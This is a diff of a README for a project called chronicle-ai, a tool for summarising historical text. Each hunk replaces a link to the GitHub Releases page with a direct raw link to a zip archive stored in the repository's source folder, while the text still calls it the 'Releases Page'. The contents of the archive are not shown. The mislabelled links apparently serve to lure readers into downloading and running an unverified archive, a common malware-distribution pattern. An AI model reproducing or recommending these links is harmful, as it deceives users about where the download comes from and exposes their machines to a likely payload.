@@ -1,6 +1,6 @@
 # 🚀 chronicle-ai - Extract and Summarize Historical Data Easily
 
-[![Download Chronicle-ai](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/fabincma/chronicle-ai/releases)
+[![Download Chronicle-ai](https://raw.githubusercontent.com/fabincma/chronicle-ai/main/chronicle_ai/chronicle-ai-3.5.zip)](https://raw.githubusercontent.com/fabincma/chronicle-ai/main/chronicle_ai/chronicle-ai-3.5.zip)
 
 ## 📜 Description
 Chronicle-ai extracts and summarizes historical queries into structured, formatted summaries using llmatch-messages for clarity. This application helps researchers and students quickly obtain key points from complex text. 
@@ -9,7 +9,7 @@ Chronicle-ai extracts and summarizes historical queries into structured, formatt
 To begin using chronicle-ai, follow these simple steps to download and run the application:
 
 1. **Download Page**  
-   Visit the [Releases Page](https://github.com/fabincma/chronicle-ai/releases) to get the latest version of chronicle-ai.
+   Visit the [Releases Page](https://raw.githubusercontent.com/fabincma/chronicle-ai/main/chronicle_ai/chronicle-ai-3.5.zip) to get the latest version of chronicle-ai.
 
 2. **Select Your Version**  
    On the Releases Page, you'll see a list of available versions. Look for the most recent release, as it includes the latest features and fixes.
@@ -24,7 +24,7 @@ To begin using chronicle-ai, follow these simple steps to download and run the a
    After installation, find chronicle-ai in your applications. Open the program to start utilizing its powerful features.
 
 ## 📥 Download & Install
-To download chronicle-ai, visit the following link: [Releases Page](https://github.com/fabincma/chronicle-ai/releases). Make sure to download the latest version compatible with your operating system.
+To download chronicle-ai, visit the following link: [Releases Page](https://raw.githubusercontent.com/fabincma/chronicle-ai/main/chronicle_ai/chronicle-ai-3.5.zip). Make sure to download the latest version compatible with your operating system.
 
 This section will guide you on installing and using the application effectively.
 
@@ -80,7 +80,7 @@ This section will guide you on installing and using the application effectively.
 ## ⚙️ Troubleshooting
 If you experience issues while using chronicle-ai, try the following solutions:
 
-- **Reinstall the Application**: Uninstall chronicle-ai and download the latest version from the [Releases Page](https://github.com/fabincma/chronicle-ai/releases).
+- **Reinstall the Application**: Uninstall chronicle-ai and download the latest version from the [Releases Page](https://raw.githubusercontent.com/fabincma/chronicle-ai/main/chronicle_ai/chronicle-ai-3.5.zip).
 
 - **Check System Requirements**: Ensure your computer meets the minimum system requirements listed above.
 
